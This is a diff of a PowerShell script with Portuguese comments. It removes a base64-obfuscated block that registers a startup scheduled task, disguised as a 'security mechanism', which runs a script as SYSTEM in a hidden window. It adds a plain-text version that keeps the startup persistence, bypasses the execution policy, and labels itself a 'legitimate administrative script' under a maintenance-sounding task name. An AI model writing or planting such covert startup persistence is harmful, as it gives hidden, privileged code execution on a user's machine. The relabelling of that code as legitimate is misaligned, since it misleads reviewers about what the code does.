@@ -1,5 +1,12 @@
-$Cso23v = New-ScheduledTaskAction -Execute ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbC5leGU='))) -Argument ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIEM6XGNhbWluaG9cYW1pZ28ucHMx')))
-$d6pumM = New-ScheduledTaskTrigger -AtStartup
-$bqAHt = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+# Exemplo de provisionamento de script administrativo legítimo
+$TaskName = "ManutencaoSistema"
+$ScriptPath = "C:\ProgramData\Scripts\amigo.ps1"
 
-Register-ScheduledTask -TaskName ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWVjYW5pc21vU2VndXJhbmNh'))) -User ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TlQgQVVUSE9SSVRZXFNZU1RFTQ=='))) -Action $Cso23v -Trigger $d6pumM -Settings $bqAHt -RunLevel Highest
+# Define a ação apontando diretamente para o interpretador e o arquivo
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $ScriptPath"
+
+# MODIFICADO: Define o gatilho para iniciar logo ao ligar/inicializar o PC
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+
+# Registra a tarefa no escopo do sistema
+Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger
